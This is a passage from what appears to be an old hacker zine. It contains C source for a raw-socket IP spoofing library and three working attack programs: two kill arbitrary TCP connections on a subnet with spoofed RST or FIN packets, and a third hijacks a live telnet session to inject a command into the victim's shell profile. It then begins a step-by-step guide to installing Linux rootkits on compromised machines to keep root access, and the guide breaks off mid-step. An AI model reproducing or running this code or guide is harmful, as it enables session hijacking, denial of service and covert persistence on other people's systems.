	printf("Raw socket ready\n");
#endif
return sp_fd;
}

void sp_send_packet (struct sp_data_exchange *sp, unsigned char proto)
{
int sp_status;
struct sockaddr_in sp_server;
struct hostent *sp_help;
int HEAD_BASE;

/* Construction of destination */
bzero((char *)&sp_server, sizeof(struct sockaddr)); 
sp_server.sin_family = AF_INET;
sp_server.sin_addr.s_addr = inet_addr(sp->dest); 
if (sp_server.sin_addr.s_addr == (unsigned int)-1)
        {                      /* if target not in DOT/number notation */ 
        if (!(sp_help=gethostbyname(sp->dest))) 
          fprintf(stderr,"unknown host %s\n", sp->dest), exit(1);
        bcopy(sp_help->h_addr, (caddr_t)&sp_server.sin_addr, sp_help->h_length);
        };

switch(proto)
   	{
	case 6: HEAD_BASE = TCP_HEAD_BASE;  break;                  /* TCP */
	case 17: HEAD_BASE = UDP_HEAD_BASE; break;                  /* UDP */
	default: exit(1); break;
	};
sp_status = sendto(sp->fd, (char *)(sp->buffer), sp->datalen+HEAD_BASE+IP_HEAD_BASE+sp->IP_optlen, 0, 
			(struct sockaddr *)&sp_server,sizeof(struct sockaddr)); 
if (sp_status < 0 || sp_status != sp->datalen+HEAD_BASE+IP_HEAD_BASE+sp->IP_optlen)
        {
        if (sp_status < 0)
          perror("Sendto"), exit(1);
        printf("hmm... Only transmitted %d of %d bytes.\n", sp_status, 
						sp->datalen+HEAD_BASE);
        };
#ifdef DEBUG
	printf("Packet transmitted...\n");
#endif
}

void sp_fix_IP_packet (struct sp_data_exchange *sp, unsigned char proto)
{ 
struct IP_header *sp_help_ip;
int HEAD_BASE;

switch(proto)
   	{
	case 6: HEAD_BASE = TCP_HEAD_BASE;  break;                  /* TCP */
	case 17: HEAD_BASE = UDP_HEAD_BASE; break;                  /* UDP */
	default: exit(1); break;
	};

sp_help_ip = (struct IP_header *) (sp->buffer);
sp_help_ip->verlen = (IP_VERSION << 4) | ((IP_HEAD_BASE+sp->IP_optlen)/4);
sp_help_ip->type = 0;
sp_help_ip->length = htons(IP_HEAD_BASE+HEAD_BASE+sp->datalen+sp->IP_optlen+sp->TCP_optlen);
sp_help_ip->ID = htons(12545);                                  /* TEST */ 
sp_help_ip->flag_offset = 0;
sp_help_ip->TTL = 69;
sp_help_ip->protocol = proto;
sp_help_ip->source = sp_getaddrbyname(sp->source);
sp_help_ip->destination =  sp_getaddrbyname(sp->dest);
sp_help_ip->checksum=in_cksum((unsigned short *) (sp->buffer), 
						IP_HEAD_BASE+sp->IP_optlen);
#ifdef DEBUG
	printf("IP header fixed...\n");
#endif
}

void sp_fix_TCP_packet (struct sp_data_exchange *sp)
{ 
char sp_pseudo_ip_construct[MTU];
struct TCP_header *sp_help_tcp;
struct pseudo_IP_header *sp_help_pseudo;
int i;

for(i=0;i<MTU;i++)
  {sp_pseudo_ip_construct[i]=0;}

sp_help_tcp = (struct TCP_header *) (sp->buffer+IP_HEAD_BASE+sp->IP_optlen);
sp_help_pseudo = (struct pseudo_IP_header *) sp_pseudo_ip_construct;

sp_help_tcp->offset_flag = htons( (((TCP_HEAD_BASE+sp->TCP_optlen)/4)<<12) | sp->flags); 
sp_help_tcp->seq_nr = htonl(sp->seq);
sp_help_tcp->ACK_nr = htonl(sp->ack);
sp_help_tcp->source = htons(sp->source_port);
sp_help_tcp->destination = htons(sp->dest_port);
sp_help_tcp->window = htons(0x7c00);             /* dummy for now 'wujx' */

sp_help_pseudo->source = sp_getaddrbyname(sp->source);
sp_help_pseudo->destination =  sp_getaddrbyname(sp->dest);
sp_help_pseudo->zero_byte = 0;
sp_help_pseudo->protocol = 6;
sp_help_pseudo->TCP_UDP_len = htons(sp->datalen+TCP_HEAD_BASE+sp->TCP_optlen);

memcpy(sp_pseudo_ip_construct+12, sp_help_tcp, sp->TCP_optlen+sp->datalen+TCP_HEAD_BASE);
sp_help_tcp->checksum=in_cksum((unsigned short *) sp_pseudo_ip_construct, 
				  sp->datalen+12+TCP_HEAD_BASE+sp->TCP_optlen);
#ifdef DEBUG
	printf("TCP header fixed...\n");
#endif
}

void transmit_TCP (int sp_fd, char *sp_data, 
			   int sp_ipoptlen, int sp_tcpoptlen, int sp_datalen, 
		           char *sp_source, unsigned short sp_source_port,
			   char *sp_dest, unsigned short sp_dest_port,
                           unsigned long sp_seq, unsigned long sp_ack, 
                           unsigned short sp_flags)
{
char sp_buffer[1500];
struct sp_data_exchange sp_struct;

bzero(sp_buffer,1500);
if (sp_ipoptlen!=0) 
	memcpy(sp_buffer+IP_HEAD_BASE,sp_data,sp_ipoptlen);

if (sp_tcpoptlen!=0) 
	memcpy(sp_buffer+IP_HEAD_BASE+TCP_HEAD_BASE+sp_ipoptlen,
			                    sp_data+sp_ipoptlen,sp_tcpoptlen);
if (sp_datalen!=0) 
	memcpy(sp_buffer+IP_HEAD_BASE+TCP_HEAD_BASE+sp_ipoptlen+sp_tcpoptlen,
			sp_data+sp_ipoptlen+sp_tcpoptlen,sp_datalen);

sp_struct.fd          = sp_fd; 
sp_struct.data        = sp_data;
sp_struct.datalen     = sp_datalen;
sp_struct.source      = sp_source;
sp_struct.source_port = sp_source_port;
sp_struct.dest        = sp_dest;
sp_struct.dest_port   = sp_dest_port;
sp_struct.seq         = sp_seq;
sp_struct.ack         = sp_ack;
sp_struct.flags       = sp_flags;
sp_struct.buffer      = sp_buffer;
sp_struct.IP_optlen   = sp_ipoptlen;          
sp_struct.TCP_optlen  = sp_tcpoptlen;          

sp_fix_TCP_packet(&sp_struct);
sp_fix_IP_packet(&sp_struct, 6);
sp_send_packet(&sp_struct, 6);
}

void sp_fix_UDP_packet (struct sp_data_exchange *sp)
{ 
char sp_pseudo_ip_construct[MTU];
struct UDP_header *sp_help_udp;
struct pseudo_IP_header *sp_help_pseudo;
int i;

for(i=0;i<MTU;i++)
  {sp_pseudo_ip_construct[i]=0;}

sp_help_udp = (struct UDP_header *) (sp->buffer+IP_HEAD_BASE+sp->IP_optlen);
sp_help_pseudo = (struct pseudo_IP_header *) sp_pseudo_ip_construct;

sp_help_udp->source = htons(sp->source_port);
sp_help_udp->destination = htons(sp->dest_port);
sp_help_udp->length =  htons(sp->datalen+UDP_HEAD_BASE);

sp_help_pseudo->source = sp_getaddrbyname(sp->source);
sp_help_pseudo->destination =  sp_getaddrbyname(sp->dest);
sp_help_pseudo->zero_byte = 0;
sp_help_pseudo->protocol = 17;
sp_help_pseudo->TCP_UDP_len = htons(sp->datalen+UDP_HEAD_BASE);

memcpy(sp_pseudo_ip_construct+12, sp_help_udp, sp->datalen+UDP_HEAD_BASE);
sp_help_udp->checksum=in_cksum((unsigned short *) sp_pseudo_ip_construct, 
						     sp->datalen+12+UDP_HEAD_BASE);
#ifdef DEBUG
	printf("UDP header fixed...\n");
#endif
}

void transmit_UDP (int sp_fd, char *sp_data, 
			   int sp_ipoptlen, int sp_datalen, 
		           char *sp_source, unsigned short sp_source_port,
			   char *sp_dest, unsigned short sp_dest_port)
{
char sp_buffer[1500];
struct sp_data_exchange sp_struct;

bzero(sp_buffer,1500);

if (sp_ipoptlen!=0) 
	memcpy(sp_buffer+IP_HEAD_BASE,sp_data,sp_ipoptlen);
if (sp_data!=NULL) 
	memcpy(sp_buffer+IP_HEAD_BASE+UDP_HEAD_BASE+sp_ipoptlen,
					     sp_data+sp_ipoptlen,sp_datalen);
sp_struct.fd          = sp_fd; 
sp_struct.data        = sp_data;
sp_struct.datalen     = sp_datalen;
sp_struct.source      = sp_source;
sp_struct.source_port = sp_source_port;
sp_struct.dest        = sp_dest;
sp_struct.dest_port   = sp_dest_port;
sp_struct.buffer      = sp_buffer;
sp_struct.IP_optlen   = sp_ipoptlen;
sp_struct.TCP_optlen  = 0;

sp_fix_UDP_packet(&sp_struct);
sp_fix_IP_packet(&sp_struct, 17);
sp_send_packet(&sp_struct, 17);
}

/* This routine stolen from ping.c -- HAHAHA!*/
unsigned short in_cksum(unsigned short *addr,int len)
{
register int nleft = len;
register unsigned short *w = addr;
register int sum = 0;
unsigned short answer = 0;
        
while (nleft > 1)
        { 
        sum += *w++;
        nleft -= 2;
        }
if (nleft == 1)
        {
        *(u_char *)(&answer) = *(u_char *)w ;
        sum += answer;
        }
sum = (sum >> 16) + (sum & 0xffff);
sum += (sum >> 16);
answer = ~sum;
return(answer);
}

/************************* Receiving department  ****************************/

int open_receiving (char *rc_device, char mode)
{
int or_fd;
struct sigaction rc_sa;
int fcntl_flag;
struct ifreq ifinfo;
char test;

/* create snoop socket and set interface promisc */
if ((or_fd = socket(AF_INET, SOCK_PACKET, htons(0x3)))==-1) 
        perror("Couldn't open Socket."), exit(1);
strcpy(ifinfo.ifr_ifrn.ifrn_name,rc_device);
if(ioctl(or_fd,SIOCGIFFLAGS,&ifinfo)<0)
	perror("Couldn't get flags."), exit(1);
ifinfo.ifr_ifru.ifru_flags |= IFF_PROMISC;
if(ioctl(or_fd,SIOCSIFFLAGS,&ifinfo)<0)
	perror("Couldn't set flags. (PROMISC)"), exit(1);

if(mode&IO_HANDLE)
	{		/* install handler */
	rc_sa.sa_handler=rc_sigio;        /* we don't use signal()        */
	sigemptyset(&rc_sa.sa_mask);      /* because the timing window is */
	rc_sa.sa_flags=0;                 /* too big...                   */
	sigaction(SIGIO,&rc_sa,NULL);
	}

if(fcntl(or_fd,F_SETOWN,getpid())<0)
	perror("Couldn't set ownership"), exit(1);

if(mode&IO_HANDLE)
	{
	if( (fcntl_flag=fcntl(or_fd,F_GETFL,0))<0)
		perror("Couldn't get FLAGS"), exit(1);
	if(fcntl(or_fd,F_SETFL,fcntl_flag|FASYNC|FNDELAY)<0)
		perror("Couldn't set FLAGS"), exit(1);
        rc_fd_abc123=or_fd;
	}
else 
	{
	if(mode&IO_NONBLOCK)
		{
		if( (fcntl_flag=fcntl(or_fd,F_GETFL,0))<0)
			perror("Couldn't get FLAGS"), exit(1);
		if(fcntl(or_fd,F_SETFL,fcntl_flag|FNDELAY)<0)
			perror("Couldn't set FLAGS"), exit(1);
		};
	};

#ifdef DEBUG
	printf("Reading socket ready\n");
#endif
return or_fd;
}

/* returns 0 when no packet read!  */
int get_packet (int rc_fd, char *buffer, int *TCP_UDP_start,unsigned  char *proto) 
{
char help_buffer[MTU];
int pack_len;
struct IP_header *gp_IPhead;

pack_len = read(rc_fd,help_buffer,1500);
if(pack_len<0)
	{
	if(errno==EWOULDBLOCK) 
		{pack_len=0;}
	else
		{perror("Read error:"); exit(1);}
	};
if(pack_len>0)
	{
	pack_len -= DEV_PREFIX;
	memcpy(buffer,help_buffer+DEV_PREFIX,pack_len);
	gp_IPhead = (struct IP_header *) buffer;
	if(proto != NULL)
		*proto = gp_IPhead->protocol;
	if(TCP_UDP_start != NULL)
		*TCP_UDP_start = (gp_IPhead->verlen & 0xF) << 2;
	}
return pack_len;
}

void wait_packet_timeout (int sig)
{
alarm(0);
WAIT_PACKET_WAIT_TIME=1;
}

int wait_packet(int wp_fd,struct sp_wait_packet *ret_values,
                char *wp_source, unsigned short wp_source_port,
                char *wp_dest, unsigned short wp_dest_port, int wp_flags, 
		int wait_time) 
{
char wp_buffer[1500];
struct IP_header *wp_iphead;
struct TCP_header *wp_tcphead;
unsigned long wp_sourcel, wp_destl;
int wp_tcpstart;
char wp_proto;

wp_sourcel=sp_getaddrbyname(wp_source);
wp_destl=sp_getaddrbyname(wp_dest);

WAIT_PACKET_WAIT_TIME=0;
if(wait_time!=0)
	{
	signal(SIGALRM,wait_packet_timeout);
	alarm(wait_time);
	}	

while(1)
  {
  while(get_packet(wp_fd, wp_buffer, &wp_tcpstart, &wp_proto)<=0) 
	{
	if (WAIT_PACKET_WAIT_TIME!=0)	{alarm(0); return -1;}
	};
  if(wp_proto == 6)
    {
    wp_iphead= (struct IP_header *) wp_buffer;
    wp_tcphead= (struct TCP_header *) (wp_buffer+wp_tcpstart);
    if( (wp_sourcel==wp_iphead->source)&&(wp_destl==wp_iphead->destination) )
      {
      if( (ntohs(wp_tcphead->source)==wp_source_port) &&
                               (ntohs(wp_tcphead->destination)==wp_dest_port) )
        {
        if( (wp_flags==0) || (ntohs(wp_tcphead->offset_flag)&wp_flags) )
          {
          ret_values->seq=ntohl(wp_tcphead->seq_nr);
          ret_values->ack=ntohl(wp_tcphead->ACK_nr);
          ret_values->flags=ntohs(wp_tcphead->offset_flag)&
						(URG|ACK|PSH|FIN|RST|SYN);
          ret_values->datalen = ntohs(wp_iphead->length) -            
                           ((wp_iphead->verlen & 0xF) << 2) -
                            ((ntohs(wp_tcphead->offset_flag) & 0xF000) >> 10);
          alarm(0);
          return 0;
          }
        }
      }
    }
  }
/*impossible to get here.. but anyways*/
alarm(0); return -1;
}


void close_receiving (void)
{
close(rc_fd_abc123);
}

void rc_sigio (int sig)                     /* Packet handling routine */
{
char rc_buffer[1500];
char packet_id [50];
unsigned char *rc_so, *rc_dest;
struct IP_header *rc_IPhead;
struct TCP_header *rc_TCPhead;
int pack_len;

if(RC_FILTSET==0) return;

if(SP_DATA_BUSY!=0)              /* skip this packet */
	return;     

pack_len = read(rc_fd_abc123,rc_buffer,1500);
rc_IPhead = (struct IP_header *) (rc_buffer + DEV_PREFIX);
if(rc_IPhead->protocol!=6) return;                          /* if not TCP */
rc_TCPhead = (struct TCP_header *) (rc_buffer + DEV_PREFIX + ((rc_IPhead->verlen & 0xF) << 2));
   
rc_so   = (unsigned char *) &(rc_IPhead->source);
rc_dest = (unsigned char *) &(rc_IPhead->destination);   
sprintf(packet_id,"%u.%u.%u.%u.%u-%u.%u.%u.%u.%u",
	      rc_so[0],rc_so[1],rc_so[2],rc_so[3],ntohs(rc_TCPhead->source),
	      rc_dest[0],rc_dest[1],rc_dest[2],rc_dest[3],ntohs(rc_TCPhead->destination)); 
	
if(strcmp(packet_id,rc_filter_string)==0)
	{ 
	SP_DATA_BUSY=1;
	CUR_SEQ = ntohl(rc_TCPhead->seq_nr);
	CUR_ACK = ntohl(rc_TCPhead->ACK_nr);
        CUR_FLAGS = ntohs(rc_TCPhead->offset_flag);
	CUR_DATALEN = ntohs(rc_IPhead->length) - 
		      ((rc_IPhead->verlen & 0xF) << 2) -
                      ((ntohs(rc_TCPhead->offset_flag) & 0xF000) >> 10);
	CUR_COUNT++;
	SP_DATA_BUSY=0;
	}
}

void set_filter (char *f_source, unsigned short f_source_port,
                 char *f_dest, unsigned short f_dest_port)
{
unsigned char *f_so, *f_des;
unsigned long f_sol, f_destl;

RC_FILTSET=0;
if(DEV_PREFIX==9999)
	fprintf(stderr,"DEV_PREFIX not set!\n"), exit(1);
f_sol   = sp_getaddrbyname(f_source);
f_destl = sp_getaddrbyname(f_dest);
f_so    = (unsigned char *) &f_sol;
f_des   = (unsigned char *) &f_destl;   
sprintf(rc_filter_string,"%u.%u.%u.%u.%u-%u.%u.%u.%u.%u",
		              f_so[0],f_so[1],f_so[2],f_so[3],f_source_port,	
			      f_des[0],f_des[1],f_des[2],f_des[3],f_dest_port); 
RC_FILTSET=1;
}

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

---=[ sniper-rst.c ]=---------------------------------------------------------
/**************************************************************************/
/*  Sniper-rst - Example program on connection killing with IP spoofing   */
/*               Using the RST flag.                                      */
/*               (illustration for 'A short overview of IP spoofing')     */
/*                                                                        */
/*  Purpose - Killing any TCP connection on your subnet                   */
/*                                                                        */
/*  Author - Dr_Sp00f (Himself)                   */
/*           Serious advice, comments, statements, greets, always welcome */
/*           flames, moronic 3l33t >/dev/null                             */
/*                                                                        */
/*  Disclaimer - This program is for educational purposes only. I am in   */
/*               NO way responsible for what you do with this program,    */
/*               or any damage you or this program causes.                */
/*                                                                        */
/*  For whom - People with a little knowledge of TCP/IP, C source code    */
/*             and general UNIX. Otherwise, please keep your hands of,    */
/*             and catch up on those things first.                        */
/*                                                                        */
/*  Limited to - Linux 1.3.X or higher.                                   */
/*               ETHERNET support ("eth0" device)                         */
/*               If you network configuration differs it shouldn't be to  */
/*               hard to modify yourself. I got it working on PPP too,    */
/*               but I'm not including extra configuration possibilities  */
/*               because this would overload this first release that is   */
/*               only a demonstration of the mechanism.                   */
/*               Anyway if you only have ONE network device (slip,        */
/*               ppp,... ) after a quick look at this code and spoofit.h  */
/*               it will only take you a few secs to fix it...            */
/*               People with a bit of C knowledge and well known with     */
/*               their OS shouldn't have to much trouble to port the code.*/
/*               If you do, I would love to get the results.              */
/*                                                                        */
/*  Compiling - gcc -o sniper-rst sniper-rst.c                            */
/*                                                                        */
/*  Usage - Usage described in the spoofing article that came with this.  */
/*          If you didn't get this, try to get the full release...        */
/*                                                                        */
/*  See also - Sniffit (for getting the necessairy data on a connection)  */
/**************************************************************************/
                                                       
#include "spoofit.h"

/* Those 2 'defines' are important for putting the receiving device in  */
/* PROMISCUOUS mode                                                     */    
#define INTERFACE	"eth0" 
#define INTERFACE_PREFIX 14  

char SOURCE[100],DEST[100];
int SOURCE_P,DEST_P;

void main(int argc, char *argv[])
{
int i,stat,j;
int fd_send, fd_receive;
unsigned long sp_ack, sp_seq;
unsigned short flags;
struct sp_wait_packet pinfo;

if(argc != 5)
	{
	printf("usage: %s host1 port1 host2 port2\n",argv[0]);
	exit(0);
	}

/* preparing some work */
DEV_PREFIX = INTERFACE_PREFIX;
strcpy(SOURCE,argv[1]);
SOURCE_P=atoi(argv[2]);
strcpy(DEST,argv[3]);
DEST_P=atoi(argv[4]);

/* opening sending and receiving sockets */
fd_send = open_sending();
fd_receive = open_receiving(INTERFACE, IO_NONBLOCK); /* nonblocking IO */

printf("Trying to terminate the connection\n");

for(i=1;i<=100;i++)
  {
  /* Waiting for a packet containing an ACK */
  stat=wait_packet(fd_receive,&pinfo,SOURCE,SOURCE_P,DEST,DEST_P,ACK,5);
  if(stat==-1)  {printf("Connection 5 secs idle or dead...\n");exit(1);}
  sp_seq=pinfo.ack;
  sp_ack=0;
  j=0;
  /* Sending our fake Packet */

/* for(j=0;j<10;j++)    This would be better       */  
/*	{                                          */
  	transmit_TCP (fd_send, NULL,0,0,0,DEST,DEST_P,SOURCE,SOURCE_P,
							sp_seq+j,sp_ack,RST);
/*      }                                          */

  /* waiting for confirmation */
  stat=wait_packet(fd_receive,&pinfo,SOURCE,SOURCE_P,DEST,DEST_P,0,5);
  if(stat<0)
      {
      printf("Connection 5 secs idle or dead...\n");
      exit(0);
      }  
  }
printf("I did not succeed in killing it.\n");
}
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

---=[ sniper-fin.c ]=---------------------------------------------------------
/**************************************************************************/
/*  Sniper-fin - Example program on connection killing with IP spoofing   */
/*               using the FIN flag.                                      */
/*               (illustration for 'A short overview of IP spoofing')     */
/*                                                                        */
/*  Purpose - Killing any TCP connection on your subnet                   */
/*                                                                        */
/*  Author - Dr_Sp00f (Himself)                                           */
/*           Serious advice, comments, statements, greets, always welcome */
/*           flames, moronic 3l33t >/dev/null                             */
/*                                                                        */
/*  Disclaimer - This program is for educational purposes only. I am in   */
/*               NO way responsible for what you do with this program,    */
/*               or any damage you or this program causes.                */
/*                                                                        */
/*  For whom - People with a little knowledge of TCP/IP, C source code    */
/*             and general UNIX. Otherwise, please keep your hands of,    */
/*             and catch up on those things first.                        */
/*                                                                        */
/*  Limited to - Linux 1.3.X or higher.                                   */
/*               ETHERNET support ("eth0" device)                         */
/*               If you network configuration differs it shouldn't be to  */
/*               hard to modify yourself. I got it working on PPP too,    */
/*               but I'm not including extra configuration possibilities  */
/*               because this would overload this first release that is   */
/*               only a demonstration of the mechanism.                   */
/*               Anyway if you only have ONE network device (slip,        */
/*               ppp,... ) after a quick look at this code and spoofit.h  */
/*               it will only take you a few secs to fix it...            */
/*               People with a bit of C knowledge and well known with     */
/*               their OS shouldn't have to much trouble to port the code.*/
/*               If you do, I would love to get the results.              */
/*                                                                        */
/*  Compiling - gcc -o sniper-fin sniper-fin.c                            */
/*                                                                        */
/*  Usage - Usage described in the spoofing article that came with this.  */
/*          If you didn't get this, try to get the full release...        */
/*                                                                        */
/*  See also - Sniffit (for getting the necessairy data on a connection)  */
/**************************************************************************/
                                                       
#include "spoofit.h"

/* Those 2 'defines' are important for putting the receiving device in  */
/* PROMISCUOUS mode                                                     */    
#define INTERFACE	"eth0" 
#define INTERFACE_PREFIX 14  

char SOURCE[100],DEST[100];
int SOURCE_P,DEST_P;

void main(int argc, char *argv[])
{
int i,stat;
int fd_send, fd_receive;
unsigned long sp_ack, sp_seq;
unsigned short flags;
struct sp_wait_packet pinfo;

if(argc != 5)
	{
	printf("usage: %s host1 port1 host2 port2\n",argv[0]);
	exit(0);
	}

/* preparing some work */
DEV_PREFIX = INTERFACE_PREFIX;
strcpy(SOURCE,argv[1]);
SOURCE_P=atoi(argv[2]);
strcpy(DEST,argv[3]);
DEST_P=atoi(argv[4]);

/* opening sending and receiving sockets */
fd_send = open_sending();
fd_receive = open_receiving(INTERFACE, IO_NONBLOCK); /* nonblocking IO */

for(i=1;i<100;i++)
  {
  printf("Attack Sequence %d.\n",i);
  /* Waiting for a packet containing an ACK */
  stat=wait_packet(fd_receive,&pinfo,SOURCE,SOURCE_P,DEST,DEST_P,ACK,10);
  if(stat==-1)  {printf("Connection 10 secs idle... timeout.\n");exit(1);}
  sp_seq=pinfo.ack;
  sp_ack=pinfo.seq+pinfo.datalen;
  /* Sending our fake Packet */
  transmit_TCP (fd_send, NULL,0,0,0,DEST,DEST_P,SOURCE,SOURCE_P,sp_seq,sp_ack,ACK|FIN);
  /* waiting for confirmation */
  stat=wait_packet(fd_receive,&pinfo,SOURCE,SOURCE_P,DEST,DEST_P,FIN,5);
  if(stat>=0)
      {
      printf("Killed the connection...\n");
      exit(0);
      }  
  printf("Hmmmm.... no response detected... (retry)\n");
  }
printf("I did not succeed in killing it.\n");
}

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

---=[ hijack.c ]=-------------------------------------------------------------
/**************************************************************************/
/*  Hijack - Example program on connection hijacking with IP spoofing     */
/*               (illustration for 'A short overview of IP spoofing')     */
/*                                                                        */
/*  Purpose - taking control of a running telnet session, and executing   */
/*            our own command in that shell.                              */
/*                                                                        */
/*  Author - Dr_Sp00f (Himself)                   */
/*           Serious advice, comments, statements, greets, always welcome */
/*           flames, moronic 3l33t >/dev/null                             */
/*                                                                        */
/*  Disclaimer - This program is for educational purposes only. I am in   */
/*               NO way responsible for what you do with this program,    */
/*               or any damage you or this program causes.                */
/*                                                                        */
/*  For whom - People with a little knowledge of TCP/IP, C source code    */ 
/*             and general UNIX. Otherwise, please keep your hands of,    */
/*             and catch up on those things first.                        */
/*                                                                        */
/*  Limited to - Linux 1.3.X or higher.                                   */
/*               ETHERNET support ("eth0" device)                         */
/*               If you network configuration differs it shouldn't be to  */
/*               hard to modify yourself. I got it working on PPP too,    */
/*               but I'm not including extra configuration possibilities  */
/*               because this would overload this first release that is   */
/*               only a demonstration of the mechanism.                   */
/*               Anyway if you only have ONE network device (slip,        */
/*               ppp,... ) after a quick look at this code and spoofit.h  */
/*               it will only take you a few secs to fix it...            */
/*               People with a bit of C knowledge and well known with     */
/*               their OS shouldn't have to much trouble to port the code.*/
/*               If you do, I would love to get the results.              */
/*                                                                        */
/*  Compiling - gcc -o hijack hijack.c                                    */
/*                                                                        */
/*  Usage - Usage described in the spoofing article that came with this.  */
/*          If you didn't get this, try to get the full release...        */ 
/*                                                                        */
/*  See also - Sniffit (for getting the necessairy data on a connection)  */
/**************************************************************************/

#include "spoofit.h"       /* My spoofing include.... read licence on this */

/* Those 2 'defines' are important for putting the receiving device in  */
/* PROMISCUOUS mode                                                     */
#define INTERFACE		"eth0"  /* first ethernet device          */
#define INTERFACE_PREFIX	 14    	/* 14 bytes is an ethernet header */

#define PERSONAL_TOUCH		666

int fd_receive, fd_send;
char CLIENT[100],SERVER[100];
int CLIENT_P;

void main(int argc, char *argv[]) 
{ 
int i,j,count;
struct sp_wait_packet attack_info;
unsigned long sp_seq ,sp_ack; 
unsigned long old_seq ,old_ack; 
unsigned long serv_seq ,serv_ack; 

/* This data used to clean up the shell line */
char to_data[]={0x08, 0x08,0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x0a, 0x0a};
char evil_data[]="echo \"echo HACKED\" >>$HOME/.profile\n";

if(argc!=4)
	{
	printf("Usage: %s client client_port server\n",argv[0]);
	exit(1);
	}
strcpy(CLIENT,argv[1]);
CLIENT_P=atoi(argv[2]);
strcpy(SERVER,argv[3]);

/* preparing all necessary sockets (sending + receiving) */
DEV_PREFIX = INTERFACE_PREFIX;
fd_send = open_sending();                  
fd_receive = open_receiving(INTERFACE, 0);  /* normal BLOCKING mode */

printf("Starting Hijacking demo - Brecht Claerhout 1996\n");
printf("-----------------------------------------------\n");

for(j=0;j<50;j++)
  {
  printf("\nTakeover phase 1: Stealing connection.\n");
  wait_packet(fd_receive,&attack_info,CLIENT, CLIENT_P, SERVER, 23,ACK|PSH,0);
  sp_seq=attack_info.seq+attack_info.datalen; 
  sp_ack=attack_info.ack;
  printf("  Sending Spoofed clean-up data...\n");
  transmit_TCP(fd_send, to_data,0,0,sizeof(to_data),CLIENT, CLIENT_P, SERVER,23,
                                                      sp_seq,sp_ack,ACK|PSH);
/* NOTE: always beware you receive y'r OWN spoofed packs! */
/*       so handle it if necessary                         */
  count=0;
  printf("  Waiting for spoof to be confirmed...\n");
  while(count<5)
	{
    	wait_packet(fd_receive, &attack_info,SERVER,23,CLIENT,CLIENT_P,ACK,0);
    	if(attack_info.ack==sp_seq+sizeof(to_data))
		count=PERSONAL_TOUCH;
    	else count++;
    	};
  if(count!=PERSONAL_TOUCH)
    	{printf("Phase 1 unsuccesfully ended.\n");}
  else {printf("Phase 1 ended.\n"); break;};
  };

printf("\nTakeover phase 2: Getting on track with SEQ/ACK's again\n");
count=serv_seq=old_ack=0;
while(count<10)
	{
	old_seq=serv_seq;
	old_ack=serv_ack;
	wait_packet(fd_receive,&attack_info,SERVER, 23, CLIENT, CLIENT_P, ACK,0);
	if(attack_info.datalen==0)
	  {
	  serv_seq=attack_info.seq+attack_info.datalen;
	  serv_ack=attack_info.ack;
          if( (old_seq==serv_seq)&&(serv_ack==old_ack) )
		count=PERSONAL_TOUCH;
 	  else count++;
          }
    	};
if(count!=PERSONAL_TOUCH)
    	{printf("Phase 2 unsuccesfully ended.\n"); exit(0);}
printf("  Server SEQ: %X (hex)    ACK: %X (hex)\n",serv_seq,serv_ack);
printf("Phase 2 ended.\n");

printf("\nTakeover phase 3: Sending MY data.\n");
printf("  Sending evil data.\n");
transmit_TCP(fd_send, evil_data,0,0,sizeof(evil_data),CLIENT,CLIENT_P, 
	     SERVER,23,serv_ack,serv_seq,ACK|PSH);
count=0;
printf("  Waiting for evil data to be confirmed...\n");
while(count<5)
	{
    	wait_packet(fd_receive,&attack_info,SERVER,23,CLIENT,CLIENT_P,ACK,0);
    	if(attack_info.ack==serv_ack+sizeof(evil_data))
		count=PERSONAL_TOUCH;
    	else count++;
    	};
if(count!=PERSONAL_TOUCH)
    	{printf("Phase 3 unsuccesfully ended.\n"); exit(0);}
printf("Phase 3 ended.\n");

}

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  2. Using LinuxRootKitIII : suid
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

Rooting machines is just half the fun, the whole point to owning something
is being able to keep root for as long as possible. To do this many kind
people have released what are known as root kits. There are currently root
kits available for a plethora of operating systems, e.g. Linux, SunOS, and
FreeBSD.

What a root kit does is installs many backdoored and trojanised programs
to replace the existing programs which are used to perform the basic tasks
of the host you owned. These tasks include: logging in, listing files,
listing proccesses and so on.

Focussing on a linux system, mainly because these are the most generally
rooted by the masses. There are a few versions of the rootkit around. The
main two you should have are LinuxRootKitIII, and LinuxRootKitII. You
should have both 2, and 3 because they are for different kinds of linux
machine. Generally, LinuxRootKitII (a.k.a lrk2) is for older Linux kernels
(in the 1.x range) and LinuxRootKitIII (a.k.a lrk3) is for the newer Linux
2.x kernels.

It should be noted somewhere in this article that you need to have owned
(rooted) the machine _before_ you try and install rootkit, installing it
as a non-root user wont work, and wont help you root the machine at all.
Also it should be noted that you shouldn't 'test' lrk2/lrk3 on your own
machine as it will probably just fuck you up.

Ok, now comes the part I like. To use lrk2 or 3, you need a few things, a
Linux box of the correct kernel version, root on that machine, and that
machine needs to be able to compile. Once you have that its not a big
problem. I'll take you thru it step by step.

  1. Upload the lrk of the correct type. Remembering that its lrk2 for 1.x
     kernels and lrk3 for 2.x kernels. To find out what kernel the remote
     host is, type "uname -a" at the prompt, the number with the 2 radix
